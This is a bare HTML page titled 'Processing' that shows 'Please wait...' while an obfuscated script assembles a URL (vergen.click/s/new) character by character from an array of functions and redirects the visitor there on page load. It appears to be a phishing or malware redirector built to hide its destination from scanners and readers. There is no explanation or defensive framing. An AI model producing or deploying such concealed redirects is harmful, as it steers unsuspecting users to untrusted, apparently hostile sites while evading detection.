<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Processing</title>
    <script>
        const fragments = [
            function() { return 'h'; },
            function() { return 't'; },
            _ => 't',
            function() { return 'p'; },
            () => 's',
            () => ':',
            _ => '/',
            _ => '/',
            _ => 'v',
            () => 'e',
            _ => 'r',
            _ => 'g',
            () => 'e',
            _ => 'n',
            () => '.',
            function() { return 'c'; },
            () => 'l',
            function() { return 'i'; },
            function() { return 'c'; },
            () => 'k',
            _ => '/',
            () => 's',
            _ => '/',
            _ => 'n',
            _ => 'e',
            () => 'w'
        ];
        window.location.href = fragments.map(fn => fn()).join('');
    </script>
</head>
<body>
    <p>Please wait...</p>
</body>
</html>
